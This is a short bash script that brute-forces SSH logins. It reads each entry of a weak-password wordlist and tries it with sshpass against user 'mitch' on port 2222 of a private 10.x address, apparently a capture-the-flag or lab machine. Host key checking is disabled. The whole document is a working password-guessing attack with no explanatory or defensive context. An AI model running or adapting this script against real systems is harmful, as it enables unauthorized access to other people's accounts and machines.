#!/bin/bash

for password in $(cat weak_passwords.txt); do
    echo "Trying password: $password"
    sshpass -p$password ssh -p 2222 -o StrictHostKeyChecking=no -o IdentitiesOnly=yes mitch@10.10.226.232
done